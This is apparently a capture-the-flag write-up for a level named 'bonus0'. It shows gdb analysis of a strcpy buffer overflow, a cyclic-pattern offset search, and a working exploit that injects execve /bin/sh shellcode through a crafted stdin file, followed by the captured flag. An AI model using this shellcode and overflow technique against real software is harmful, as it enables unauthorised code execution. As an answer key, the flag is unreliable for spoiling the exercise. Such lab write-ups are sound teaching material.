@@ -1,0 +1,72 @@
+
+██████╗  ██████╗ ███╗   ██╗██╗   ██╗███████╗     ██████╗ 
+██╔══██╗██╔═══██╗████╗  ██║██║   ██║██╔════╝    ██╔═████╗
+██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████╗    ██║██╔██║
+██╔══██╗██║   ██║██║╚██╗██║██║   ██║╚════██║    ████╔╝██║
+██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝███████║    ╚██████╔╝
+╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝     ╚═════╝ 
+          
+		  
+gdb bonus0
+
+disas main
+
+There is a call to <pp> function.
+This function is calling twice the function <p>.
+The function <p> simply read a string on the stdin.
+Then the function <pp> concatenates them and display the final string.
+
+There is a cal to <strcpy>, so we can try to overflow it.
+
+Finding the offset:
+
+gdb bonus0
+
+run
+
+Enter:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+
+Enter:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+
+
+There is an offset at the 9th byte, but we don't know if this offset is on the first string or the second.
+
+run
+
+Enter:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Enter:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+  
+Now we know that the offset is on the second string.
+
+The difficulty of this exercise is to send two parameters to the program (with stdin) using a single file.
+For this, we just fill the first buffer (wich is 4096 size long). 
+Then the rest will be writen in the second buffer.
+
+In <p> function there is a call to strchr which is looking for a '\n' (corresponding to the 'Enter' key pressed)
+to get each string.
+
+So, for the exploit we will:
+-Fill the first Buffer
+-Write a '\n' to get the first string
+-Write the adress of our shellcode
+-Fill the second string
+
+export SHELLCODE=`python -c "print '\x25\xf7\xff\xbf' + '\x90' * 500 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+
+python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x0e\xf7\xff\xbf' + 'A' * 30" > /tmp/file
+
+cat /tmp/file - | ./bonus0
+
+whoami
+
+cd ../bonus1 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9 |
+|══════════════════════════════════════════════════════════════════|
+
